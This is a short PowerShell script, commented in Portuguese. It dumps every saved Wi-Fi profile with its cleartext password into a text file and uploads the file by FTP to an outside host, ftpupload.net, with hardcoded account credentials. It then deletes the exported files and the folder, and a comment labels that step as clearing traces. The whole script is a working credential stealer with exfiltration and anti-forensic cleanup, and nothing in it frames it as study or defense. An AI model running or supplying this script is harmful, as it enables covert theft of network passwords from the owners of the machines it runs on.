#tudo será slavo aqui
$p = "C:\wipass"
mkdir $p
cd $p

#coleta as senhas e cria arquivo
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $a
}

# Define FTP details
$ftpUrl = "ftp://ftpupload.net/wifipass.txt"
$username = "b18_35330579"
$password = "Htp@2023"
$localPath = "C:\wipass\wifipass.txt"

# Criando a requisição FTP
$request = [System.Net.FtpWebRequest]::Create($ftpUrl)
$request.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$request.Credentials = New-Object System.Net.NetworkCredential($username, $password)

# Definindo o modo de transferência (uncomment the appropriate line)
#$request.UseBinary = $true # Para modo binário
$request.UseBinary = $false # Para modo ASCII

# Lendo o arquivo e fazendo o upload
$content = [System.IO.File]::ReadAllBytes($localPath)
$requestStream = $request.GetRequestStream()
$requestStream.Write($content, 0, $content.Length)
$requestStream.Close()

$response = $request.GetResponse()
$response.StatusDescription

#Write-Output "Upload concluído!"

#limpa rastros
rm *.xml
rm *.txt
cd ..
rm wipass

exit